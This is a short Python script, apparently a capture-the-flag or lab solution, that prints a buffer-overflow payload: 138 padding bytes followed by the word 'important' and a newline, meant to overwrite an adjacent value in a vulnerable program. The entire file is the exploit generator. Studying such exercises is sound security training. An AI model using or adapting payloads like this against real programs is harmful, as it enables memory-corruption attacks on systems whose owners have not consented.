#!/usr/bin/env python3

import sys


oflow = b'A' * 138 + b'important'


exploit = bytearray(oflow)
exploit.extend(b'\n')
sys.stdout.buffer.write(exploit)


